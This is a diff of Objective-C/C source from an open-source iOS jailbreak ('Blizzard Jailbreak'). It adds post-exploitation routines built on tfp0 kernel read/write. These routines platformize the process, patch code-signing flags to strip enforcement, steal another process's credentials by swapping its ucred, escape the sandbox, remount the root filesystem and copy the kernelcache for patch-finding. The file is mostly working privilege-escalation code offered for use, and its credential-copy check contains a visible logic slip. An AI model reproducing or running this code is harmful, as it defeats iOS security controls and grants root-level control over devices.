@@ -20,10 +20,28 @@
 #include "../Kernel Utilities/kernel_utils.h"
 #include "../Kernel Utilities/kexecute.h"
 #include "BlizzardLog.h"
+#include "../APFS Utilities/rootfs_remount.h"
+#include "../APFS Utilities/snapshot_tools.h"
+#include "../Kernel Utilities/kernSymbolication.h"
+
 
 mach_port_t tfp0 = 0;
 uint64_t KernelBase;
 uint64_t defaultCredentials;
+uint64_t ourProc;
+
+void platformize(pid_t pid) {
+    if (!pid) return;
+    
+    uint64_t proc = proc_of_pid(pid);
+    uint64_t task = rk64(proc + off_task);
+    uint32_t t_flags = rk32(task + off_t_flags);
+    t_flags |= 0x400; // add TF_PLATFORM flag, = 0x400
+    wk32(task+off_t_flags, t_flags);
+    uint32_t csflags = rk32(proc + off_p_csflags);
+    wk32(proc + off_p_csflags, csflags | 0x24004001u); //patch csflags
+}
+
 
 int exploit_init(){
     printf("Blizzard Jailbreak\nby GeoSn0w (@FCE365)\n\nAn Open-Source Jailbreak for you to study and dissect :-)\n\n");
@@ -37,20 +55,23 @@ int exploit_init(){
             return 2;
         }
         kernel_slide = (uint32_t)(KernelBase - 0xFFFFFFF007004000);
+        prepareKernelForPatchFinder();
+        /*
         int ret = initializePatchFinderWithBase(KernelBase, NULL); // patchfinder
         if (ret) {
             printf("Failed to initialize patchfinder\n");
             return 3;
         }
+         */
         printf("Initialized patchfinder\n");
-        findOurOwnProcess();
+        ourProc = findOurOwnProcess();
         rootifyOurselves();
         defaultCredentials = escapeSandboxForProcess(getpid());
-        restoreProcessCredentials(defaultCredentials, getpid());
         initializeKernelExecute();
-        terminateKernelExecute();
-        terminatePatchFinder();
-    
+        uint64_t kern_proc = proc_of_pid(0);
+        printf("Kernel Proc is: 0x%llx\n", kern_proc);
+        setcsflags(getpid()); // set some csflags
+        platformize(getpid()); // set TF_PLATFORM
         return 0;
     } else {
         printf("ERROR: Could not get tfp0!\n");
@@ -59,6 +80,12 @@ int exploit_init(){
    
 }
 
+int cleanupAfterBlizzard(){
+    restoreProcessCredentials(defaultCredentials, getpid()); // Give back our process' credentials, otherwise the device will act weird.
+    terminateKernelExecute(); // Always clean up after your jailbreak components. Helps stability a lot.
+    terminatePatchFinder();
+    return 0;
+}
 
 int rootifyOurselves(){
     printf("Preparing to elevate own privileges to ROOT!\n");
@@ -148,4 +175,78 @@ uint64_t findOurOwnProcess(){
         printf("ERROR: Cannot find our own process!\n");
     }
     return self;
+}
+
+uint64_t copyPIDCredentials(pid_t processToBeGivenCreds, pid_t donorProcess){
+    printf("CredentialsCopier: Giving process %d process %d's credentials...\n", processToBeGivenCreds, donorProcess);
+    uint64_t procFromPID = proc_of_pid(processToBeGivenCreds);
+    uint64_t donorproc = proc_of_pid(donorProcess);
+    uint64_t processCredentials = rk64(procFromPID + off_p_ucred);
+    uint64_t donorcred = rk64(donorproc + off_p_ucred);
+    
+    if (procFromPID != 0 || donorcred != 0){
+        wk64(procFromPID + off_p_ucred, donorcred);
+        printf("CredentialsCopier: Successfully granted credentials from process!\n");
+        return processCredentials;
+    } else {
+        printf("CredentialsCopier: Failed to copy credentials from process!\n");
+        return -1;
+    }
+}
+
+int remountFileSystem(){
+    int returnValue = remountRootFS();
+
+    if (returnValue == 0) {
+        printf("Remount ROOT FS: Successfully remounted!\n");
+        return 0;
+    } else {
+        printf("Remount ROOT FS: Failed to Remount!\n");
+        return -1;
+    }
+}
+
+int setcsflags(pid_t pid) {
+    if (!pid) return NO;
+    uint64_t proc = proc_of_pid(pid);
+    uint32_t csflags = rk32(proc + off_p_csflags);
+    uint32_t newflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
+    wk32(proc + off_p_csflags, newflags);
+    
+    if (rk32(proc + off_p_csflags) == newflags){
+        printf("Successfully set CodeSign Flags!\n");
+        return 0;
+    } else {
+        printf("Failed to set CodeSign Flags!\n");
+        return -1;
+    }
+}
+
+int prepareKernelForPatchFinder(){
+    NSString *newPath;
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+    NSError *error;
+    
+    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+    [formatter setDateFormat:@"dd.MM.YY:HH.mm.ss"];
+    
+    NSString *docs = [[[fileManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
+    mkdir(strdup([docs UTF8String]), 0777);
+    newPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"%@_kernelcache", [formatter stringFromDate:[NSDate date]]]];
+    
+    printf("[*] copying to %s\n", [newPath UTF8String]);
+    
+    [fileManager copyItemAtPath:@"/System/Library/Caches/com.apple.kernelcaches/kernelcache" toPath:newPath error:&error];
+    if (error) {
+        printf("[-] Failed to copy kernelcache with error: %s\n", [[error localizedDescription] UTF8String]);
+        return 4;
+    }
+    
+    // init
+    if (decompressKernelCache(strdup([newPath UTF8String]))) {
+        printf("[-] Error initializing KernelSymbolFinder\n");
+        return 4;
+    }
+    initializePatchFinderWithBase(0, (char *)[[newPath stringByAppendingString:@".dec"] UTF8String]);
+    return 0;
 }
